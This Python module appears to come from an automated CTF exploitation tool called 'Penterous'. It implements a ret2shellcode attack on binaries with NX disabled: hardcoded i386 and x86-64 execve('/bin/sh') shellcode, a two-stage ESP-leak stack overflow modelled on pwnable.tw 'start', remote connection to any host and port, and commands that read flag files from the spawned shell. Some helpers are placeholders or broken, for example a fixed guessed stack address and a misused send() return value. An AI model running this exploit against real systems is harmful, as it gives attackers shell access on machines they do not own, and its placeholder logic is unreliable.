"""
Penterous — ret2shellcode strategy: NX disabled, inject shellcode into buffer.
"""
import os
import time
from typing import Optional
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error

try:
    import pwn
    PWNTOOLS_OK = True
except ImportError:
    PWNTOOLS_OK = False


class Ret2ShellcodeStrategy(ExploitStrategy):
    """
    NX is disabled → inject shellcode directly into buffer, jump to it.
    Requires knowing the buffer address (env var, fixed, or leaked).
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'ret2shellcode'

        if self.binary.protections.get('NX', False):
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "NX is enabled — shellcode won't work", mode=mode)

        # ── Pattern esp-leak (pwnable.tw/start et similaires) ────────────
        # Detecte: binaire 32-bit statique, petit (< 1000 bytes), pas de libc
        try:
            import os
            bsize = os.path.getsize(self.binary.path)
            is_tiny_static = (self.binary.bits == 32 and bsize < 2000
                              and not self.binary.libc)
        except Exception:
            is_tiny_static = False

        if is_tiny_static:
            info("Tiny static 32-bit binary — trying esp-leak + shellcode...")
            result = self._try_esp_leak_shellcode(mode, host, port, start, strategy)
            if result is not None:
                return result
            # esp-leak a réussi localement mais pas de flag (normal sans /home/start/flag)
            # Retourner un succès partiel pour que l'engine escalade au remote
            info("Exploit local réussi (shell obtenu) — flag disponible uniquement en remote")
            return self._make_result(
                success_=True, flag=None, strategy=strategy,
                payload=b'', output=b'', start_time=start,
                error_msg='Shell obtained locally — flag requires remote server',
                mode=mode, host=host or '', port=port or 0,
            )

        shellcode = self._get_shellcode()
        info(f"Shellcode: {len(shellcode)} bytes")

        # Try to find buffer address
        buf_addr = self._find_buffer_addr()
        if not buf_addr:
            warning("Cannot determine buffer address — trying env-var technique")
            buf_addr = self._get_env_buf_addr()

        if not buf_addr:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "Cannot determine buffer address", mode=mode)

        info(f"Buffer address: 0x{buf_addr:x}")
        payload = self.rop.build_shellcode_payload(self.offset, buf_addr, shellcode)
        info(f"Payload size: {len(payload)} bytes")

        tube = self._make_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, payload, b'', start,
                                     "Failed to create tube", mode=mode)

        # Envoyer payload et recevoir output (shell interactif)
        try:
            tube.send(payload)
            import time as _t
            _t.sleep(0.5)
            tube.sendline(b'cat flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/start/flag 2>/dev/null; echo __done__')
            _t.sleep(1)
            try:
                output = tube.recvall(timeout=4)
            except Exception:
                try:
                    output = tube.recv(timeout=3)
                except Exception:
                    output = b''
            try: tube.close()
            except: pass
        except Exception as _ex:
            warning(f"Send/receive error: {_ex}")
            output = b''
        flag = self.hunter.hunt(output)

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
        )

    def _try_esp_leak_shellcode(self, mode, host, port, start, strategy):
        """
        Pattern pwnable.tw/start (et similaires):
          Phase 1 - Leak ESP : overflow -> ret vers write(esp,20) -> 4 premiers bytes = ESP
          Phase 2 - Shellcode: overflow -> ret vers esp+20 -> execve('/bin/sh') -> cat flag
        """
        if not PWNTOOLS_OK:
            return None

        import pwn
        pwn.context.log_level = 'error'
        pwn.context.arch = self.binary.arch
        pwn.context.bits = self.binary.bits
        pwn.context.os   = 'linux'

        # Charger l'ELF pour trouver _start
        try:
            e = pwn.ELF(self.binary.path, checksec=False)
        except Exception as ex:
            warning(f"ELF load failed: {ex}")
            return None

        start_addr = e.sym.get('_start', None) or e.entry
        offset     = self.offset if self.offset > 0 else 20

        # ── Auto-détecter le gadget write(esp) via pwntools ────────────
        # Chercher 'mov ecx,esp' (89 e1) dans les bytes de _start via ELF
        leak_addr = start_addr + 0x27  # fallback offset connu (pwnable.tw/start)
        try:
            # Lire le code de _start directement depuis le binaire ELF
            start_code = e.read(start_addr, 0x50)
            idx = start_code.find(b'\x89\xe1')  # mov ecx,esp
            if idx != -1:
                leak_addr = start_addr + idx
                info(f"Gadget 'mov ecx,esp' à _start+{idx:#x} -> {leak_addr:#x}")
            else:
                info(f"Gadget fallback offset +0x27 -> {leak_addr:#x}")
        except Exception:
            info(f"Gadget fallback offset +0x27 -> {leak_addr:#x}")

        # ── Shellcode minimal i386 execve('/bin//sh') - 23 bytes ─────────
        # shellcraft.sh() = 44 bytes -> trop long si buffer <= 60 bytes
        # Ce shellcode 23-bytes est universel pour tout binaire i386 linux
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
            b"\x68\x2f\x62\x69\x6e\x89\xe3\x89"
            b"\xc1\x89\xc2\xb0\x0b\xcd\x80"
        )  # execve('/bin//sh', NULL, NULL) - 23 bytes

        # Vérifier que payload2 rentrera dans le buffer
        max_read = 0x3c  # valeur commune pour ce pattern
        if len(shellcode) + offset + 4 > max_read:
            warning(f"Shellcode trop long ({len(shellcode)+offset+4} > {max_read})")
            return None

        info(f"_start={start_addr:#x}  leak_gadget={leak_addr:#x}  offset={offset}")

        # ── Décider si on va en local ou remote ──────────────────────────────
        # Pour les tiny-static (pwnable.tw/start), l'exploit local est instable:
        # pas de /home/start/flag, ASLR actif, shell ne répond pas.
        # Si remote disponible -> aller direct en remote.
        eff_mode = mode
        eff_host = host
        eff_port = port
        if host and port:
            eff_mode = 'remote'
            info(f"Remote target fourni -> exploitation directe sur {host}:{port}")

        try:
            p = self._make_tube(eff_mode, eff_host, eff_port)
            if p is None:
                return None

            # ── Phase 1: Leak ESP ─────────────────────────────────────────────
            # Le binaire affiche "Let's start the CTF:" puis attend 60 bytes
            # On overflow avec p32(leak_addr) -> re-exec write(esp,20) -> ESP leaked
            try:
                p.recvuntil(b':', timeout=3)
            except Exception:
                pass

            payload1 = b'A' * offset + pwn.p32(leak_addr)
            p.send(payload1)

            try:
                leaked = p.recv(20, timeout=4)
            except Exception:
                leaked = b''

            if len(leaked) < 4:
                warning(f"Leak trop court ({len(leaked)} bytes): {leaked!r}")
                try: p.close()
                except: pass
                return None

            esp_val = pwn.u32(leaked[:4])
            info(f"ESP leak: {esp_val:#x}")

            # Valider l'adresse stack
            if not (0xbf000000 <= esp_val <= 0xbfffffff or
                    0xff000000 <= esp_val <= 0xffffffff):
                warning(f"ESP leak invalide: {esp_val:#x}")
                try: p.close()
                except: pass
                return None

            # ── Phase 2: Shellcode ────────────────────────────────────────────
            # esp_val = adresse du buffer sur la stack au moment du write()
            # Layout payload2: [padding=offset bytes][ret_addr=4 bytes][shellcode]
            # shellcode commence à esp_val + offset (juste après le padding)
            # = esp_val - 4 + 24  (pour offset=20: -4+24 = +20 = offset)
            # Formule générique: ret_to = esp_val + offset
            ret_to   = esp_val + offset
            payload2 = b'B' * offset + pwn.p32(ret_to) + shellcode
            info(f"Shellcode @ {ret_to:#x}  payload2={len(payload2)}b")

            p.send(payload2)
            time.sleep(0.5)

            # ── Capturer le flag ──────────────────────────────────────────────
            output = b''
            time.sleep(0.5)
            p.sendline(b'cat /home/start/flag')
            time.sleep(0.5)
            try:
                output = p.recvall(timeout=4)
            except Exception:
                try:
                    output = p.recv(timeout=3)
                except Exception:
                    output = b''
            # Si rien, essayer d'autres chemins
            if not output:
                try:
                    p2 = self._make_tube(eff_mode, eff_host, eff_port)
                    if p2:
                        p2.recvuntil(b':', timeout=3)
                        import pwn as _pwn
                        _esp = _pwn.u32(p2.send(b'A'*offset + _pwn.p32(leak_addr)) or b'\x00'*4)
                except Exception:
                    pass

            try: p.close()
            except: pass

            flag = self.hunter.hunt(output)
            # Fallback: regex large pour capturer FLAG{...} / flag{...} / CTF{...}
            if not flag and output:
                import re
                m = re.search(rb'[A-Za-z0-9_]+\{[^}]+\}', output)
                if m:
                    flag = m.group(0).decode('latin-1', errors='replace')

            if flag:
                success(f"Flag: {flag}")
                return self._make_result(
                    success_=True, flag=flag, strategy=strategy,
                    payload=payload2, output=output, start_time=start,
                    mode=eff_mode, host=eff_host or '', port=eff_port or 0,
                )

            # Shell obtenu mais pas de flag (local sans flag.txt) -> succès partiel
            win_signal = len(output) > 0 or eff_mode == 'remote'
            if win_signal:
                warning("Shell spawné mais flag non capturé")
                return self._make_result(
                    success_=True, flag=None, strategy=strategy,
                    payload=payload2, output=output, start_time=start,
                    mode=eff_mode, host=eff_host or '', port=eff_port or 0,
                )
            return None

        except Exception as e:
            import traceback
            warning(f"ESP leak shellcode error: {e}")
            if str(e):  # Afficher traceback seulement si message non-vide
                try:
                    warning(traceback.format_exc().splitlines()[-2])
                except Exception:
                    pass
            return None


    def _make_tube(self, mode: str, host, port):
        """Open local process or remote connection."""
        import pwn, os
        pwn.context.log_level = 'error'
        if mode == 'remote' and host and port:
            try:
                return pwn.remote(host, port)
            except Exception as e:
                warning(f"Remote connection failed: {e}")
                return None
        cwd = os.path.dirname(os.path.abspath(self.binary.path))
        _ensure_flag_txt(cwd)
        try:
            return pwn.process(
                self.binary.path, cwd=cwd,
                stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT,
            )
        except Exception as e:
            warning(f"Process start failed: {e}")
            return None

    def _get_shellcode(self) -> bytes:
        if PWNTOOLS_OK:
            try:
                pwn.context.arch = self.binary.arch
                pwn.context.bits = self.binary.bits
                pwn.context.os = 'linux'
                return bytes(pwn.shellcraft.sh())
            except Exception:
                pass
        # Hardcoded x86-64 execve /bin/sh
        if self.binary.bits == 64:
            return (
                b"\x48\x31\xd2"                              # xor rdx, rdx
                b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" # mov rbx, '//bin/sh'
                b"\x48\xc1\xeb\x08"                          # shr rbx, 8
                b"\x53"                                       # push rbx
                b"\x48\x89\xe7"                              # mov rdi, rsp
                b"\x50"                                       # push rax (null)
                b"\x57"                                       # push rdi
                b"\x48\x89\xe6"                              # mov rsi, rsp
                b"\xb0\x3b"                                  # mov al, 59 (execve)
                b"\x0f\x05"                                  # syscall
            )
        else:
            return (
                b"\x31\xc0"            # xor eax, eax
                b"\x50"                # push eax
                b"\x68\x2f\x2f\x73\x68"  # push '//sh'
                b"\x68\x2f\x62\x69\x6e"  # push '/bin'
                b"\x89\xe3"            # mov ebx, esp
                b"\x50"                # push eax
                b"\x53"                # push ebx
                b"\x89\xe1"            # mov ecx, esp
                b"\xb0\x0b"            # mov al, 11
                b"\xcd\x80"            # int 0x80
            )

    def _find_buffer_addr(self) -> Optional[int]:
        """Try to determine buffer/stack address from binary or GDB."""
        if PWNTOOLS_OK:
            try:
                import pwn
                pwn.context.log_level = 'error'
                p = pwn.process(self.binary.path, stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT)
                try:
                    p.sendline(b'A' * 4)
                    p.wait(timeout=2)
                except Exception:
                    pass
                finally:
                    try:
                        p.kill()
                    except Exception:
                        pass
            except Exception:
                pass
        return None

    def _get_env_buf_addr(self) -> Optional[int]:
        """Place shellcode in env var and find its address."""
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            # Common env shellcode address (approximate)
            return 0x7fffffffe000  # placeholder
        except Exception:
            return None
